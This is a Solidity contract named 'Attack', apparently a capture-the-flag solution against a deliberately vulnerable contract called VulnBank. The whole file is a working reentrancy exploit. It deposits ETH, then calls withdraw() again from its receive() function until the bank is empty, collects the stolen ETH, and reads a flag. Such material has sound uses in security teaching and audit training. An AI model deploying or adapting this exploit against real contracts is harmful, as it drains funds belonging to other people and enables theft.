// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./VulnBank.sol";

contract Attack {
    VulnBank public target;
    uint public attackAmount;

    constructor(address _target) public {
        target = VulnBank(payable(_target));
    }

    // Step 1: Deposit ETH into the vulnerable bank
    function deposit() external payable {
        attackAmount = msg.value;
        target.deposit{value: msg.value}();
    }

    // Step 2: Start the drain
    function attack() external {
        target.withdraw(attackAmount);
    }

    // This is called every time VulnBank sends us ETH.
    // Re-enter withdraw() as long as the bank still has funds.
    receive() external payable {
        if (address(target).balance >= attackAmount) {
            target.withdraw(attackAmount);
        }
    }

    // Step 3: Read the flag after draining
    function getFlag() external view returns (string memory) {
        return target.getFlag();
    }

    // Withdraw stolen ETH from this contract
    function collect() external {
        msg.sender.transfer(address(this).balance);
    }
}
